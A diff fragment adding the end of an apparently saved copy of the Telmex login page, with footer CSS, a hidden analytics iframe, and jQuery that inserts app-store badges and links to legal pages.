+    position: absolute;
+    top: 670px;
+    width: 70%;
+    text-align: center;
+    font-size: 12px;
+}
+  
+#legales ul a {
+    color: #55667a;
+}
+#legales ul a:after {
+    content: '|';
+    margin: 0 6px;
+}
+#legales a:visited {
+    text-decoration: none;
+}
+</style>  
+<iframe allow="join-ad-interest-group" data-tagging-id="G-1XC9BVR3MG" data-load-time="1728260318543" height="0" width="0" src="./Telmex Login_files/rul.html" style="display: none; visibility: hidden;"></iframe><script type="text/javascript" id="" charset="">$("#form-main").append('\x3cdiv id\x3d"apps" style\x3d"text-align: center;margin:20px 0px;"\x3e\x3cspan style\x3d"font-size:15px"\x3e\u00a1Descarga y conoce la app Telmex!\x3c/span\x3e\x3cbr/\x3e\x3ca class\x3d"appImg" href\x3d"https://play.google.com/store/apps/details?id\x3dcom.telmex.mitelmex\x26utm_source\x3dLogin\x26utm_medium\x3dMiTelmex\x26utm_content\x3dGoogle\x26utm_campaign\x3dDescargaAppTelmex" target\x3d"_blank"\x3e\x3cimg src\x3d"https://telmex.com/documents/23521/66013/google-play-badge.svg/d74c2bc7-9aed-91c5-e634-1c59554d2ee6" alt\x3d"Google Play" width\x3d"120px"\x3e\x3c/a\x3e  \x3ca class\x3d"appImg" href\x3d"https://itunes.apple.com/mx/app/telmex/id1135440722?\x26utm_source\x3dLogin\x26utm_medium\x3dMiTelmex\x26utm_content\x3dApple\x26utm_campaign\x3dDescargaAppTelmex" target\x3d"_blank"\x3e\x3cimg src\x3d"https://telmex.com/documents/23521/66013/apple_store_badge.svg/4e98269d-98f9-f89e-87b7-9d55029c4de5" alt\x3d"App Store" width\x3d"120px"\x3e\x3c/a\x3e\x3c/div\x3e');
+$("#wrapper").append('\x3cdiv id\x3d"legales"\x3e\x3cstrong\x3e2024 Telmex. Todos los derechos reservados\x3c/strong\x3e \x3cul\x3e \x3cli\x3e\x3ca href\x3d"https://telmex.com/web/acerca-de-telmex/aviso-de-privacidad" target\x3d"_self"\x3eAviso de privacidad\x3c/a\x3e\x3c/li\x3e \x3cli\x3e\x3ca href\x3d"https://telmex.com/web/hogar/contrato-marco" target\x3d"_lightbox"\x3eContrato Marco de prestaci\u00f3n de servicios\x3c/a\x3e\x3c/li\x3e \x3cli\x3e\x3ca href\x3d"https://telmex.com/web/acerca-de-telmex/oferta-mayoristas" target\x3d"_self"\x3eOferta de servicios Mayoristas\x3c/a\x3e\x3c/li\x3e \x3cli\x3e\x3ca href\x3d"https://telmex.com/web/hogar/contratos-audibles" target\x3d"_blank"\x3eContrato Marco y T\u00e9rminos en formato audible\x3c/a\x3e\x3c/li\x3e \x3cli\x3e\x3ca href\x3d"https://telmex.com/web/acerca-de-telmex/colaboracion-en-materia-de-seguridad-y-justicia" target\x3d"_self"\x3eColaboraci\u00f3n con justicia\x3c/a\x3e\x3c/li\x3e \x3cli\x3e\x3ca href\x3d"https://telmex.com/mapa-de-sitio" target\x3d"_blank"\x3eMapa de sitio\x3c/a\x3e\x3c/li\x3e \x3cli\x3e\x3ca href\x3d"https://www.hearcolors.com.mx/SelloAccesibilidad.php?num_clte\x3d040E1736" target\x3d"_blank"\x3eDeclaraci\u00f3n de accesibilidad\x3c/a\x3e\x3c/li\x3e \x3c/ul\x3e \x3c/div\x3e');</script><div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div></div></body></html>
